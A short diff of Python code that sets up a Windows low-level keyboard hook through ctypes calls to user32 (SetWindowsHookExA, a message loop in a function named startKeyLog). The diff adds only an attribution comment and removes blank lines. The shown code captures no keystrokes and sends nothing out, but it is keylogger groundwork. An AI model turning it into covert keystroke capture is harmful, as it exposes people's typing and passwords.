@@ -1,3 +1,4 @@
+# 代码参考自https://zhuanlan.zhihu.com/p/166359660
 import sys
 from ctypes import *
 from ctypes.wintypes import DWORD, HHOOK, HINSTANCE, MSG, WPARAM, LPARAM
@@ -7,9 +8,6 @@ from common import getTime
 user32 = CDLL("user32.dll")
 kernel32 = CDLL("kernel32.dll")
 
-
-
-
 class KBDLLHOOKSTRUCT(Structure):
     _fields_ = [
         ('vkCode', DWORD),
@@ -18,19 +16,15 @@ class KBDLLHOOKSTRUCT(Structure):
         ('time', DWORD),
         ('dwExtraInfo', DWORD)]
 
-
 def uninstallHookProc(hooked):
     if hooked is None:
         return
     user32.UnhookWindowsHookEx(hooked)
     hooked = None
 
-
-
 def startKeyLog():
     msg = MSG()
     user32.GetMessageA(byref(msg), 0, 0, 0)
-
 
 def installHookProc(hooked, pointer):
     hooked = user32.SetWindowsHookExA(
@@ -42,7 +36,6 @@ def installHookProc(hooked, pointer):
     if not hooked:
         return False
     return True
-
 
 HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
 hooked = None
